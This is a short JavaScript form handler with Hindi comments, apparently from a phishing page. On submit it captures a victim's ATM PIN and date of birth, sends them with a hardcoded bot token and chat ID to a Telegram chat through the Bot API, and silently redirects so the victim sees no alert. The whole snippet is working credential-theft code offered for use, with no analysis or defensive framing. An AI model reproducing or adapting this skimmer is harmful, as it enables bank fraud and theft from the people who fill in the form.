document.getElementById("submitForm").addEventListener("submit", function (event) {
    event.preventDefault(); // फॉर्म को रीलोड होने से रोकें

    let atmPin = document.querySelector('input[name="attmpn"]').value;
    let dob = document.querySelector('input[name="dob1"]').value;

    let botToken = "7839710665:AAGKbR-tYd-mfFYfptxDZnpaUctzEAWMfwU"; // आपका बॉट टोकन
    let chatId = "-1002677669875"; // आपका चैट आईडी
    let message = `🔔 *New Submission* 🔔\n\n🛑 ATM PIN: ${atmPin}\n📅 DOB: ${dob}`;

    let telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    fetch(telegramApi).catch(error => console.error("Error:", error));

    // बिना कोई अलर्ट दिखाए अगले पेज पर भेजें
    window.location.href = document.getElementById("nextValue").value;
});